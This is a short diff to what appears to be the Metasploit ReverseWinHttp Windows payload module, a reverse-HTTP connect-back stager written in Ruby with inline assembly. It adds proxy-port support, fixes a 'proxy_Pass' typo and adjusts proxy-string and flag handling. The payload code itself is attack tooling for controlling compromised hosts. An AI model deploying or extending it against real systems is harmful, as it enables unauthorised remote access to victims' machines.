@@ -37,6 +37,7 @@ module Payload::Windows::ReverseWinHttp
       conf[:exitfunk]         = datastore['EXITFUNC']
       conf[:verify_cert_hash] = opts[:verify_cert_hash]
       conf[:proxy_host]       = datastore['PayloadProxyHost']
+      conf[:proxy_port]       = datastore['PayloadProxyPort']
       conf[:proxy_user]       = datastore['PayloadProxyUser']
       conf[:proxy_pass]       = datastore['PayloadProxyPass']
       conf[:proxy_type]       = datastore['PayloadProxyType']
@@ -157,7 +158,8 @@ module Payload::Windows::ReverseWinHttp
         0x00000100 | # SECURITY_FLAG_IGNORE_UNKNOWN_CA
         0x00000080 ) # SECURITY_FLAG_IGNORE_REVOCATION
     else
-      http_open_flags = 0x00000100 # WINHTTP_FLAG_BYPASS_PROXY_CACHE
+      http_open_flags = (
+        0x00000100 ) # WINHTTP_FLAG_BYPASS_PROXY_CACHE
     end
 
     asm = %Q^
@@ -194,7 +196,7 @@ module Payload::Windows::ReverseWinHttp
         push ebx               ; Flags
         push esp               ; ProxyBypass ("")
       call get_proxy_server
-        db "#{proxy_info}", 0x00
+        db #{proxy_info}
       get_proxy_server:
                                ; ProxyName (via call)
         push 3                 ; AccessType (NAMED_PROXY= 3)
@@ -245,7 +247,7 @@ module Payload::Windows::ReverseWinHttp
         push ebx               ; pAuthParams (NULL)
       ^
 
-      if proxy_Pass
+      if proxy_pass
         asm << %Q^
         call got_proxy_pass    ; put proxy_pass on the stack
       proxy_pass:
@@ -255,7 +257,7 @@ module Payload::Windows::ReverseWinHttp
         ^
       else
         asm << %Q^
-        push ebx               ; pAuthParams (NULL)
+        push ebx               ; pwszPassword (NULL)
         ^
       end
 
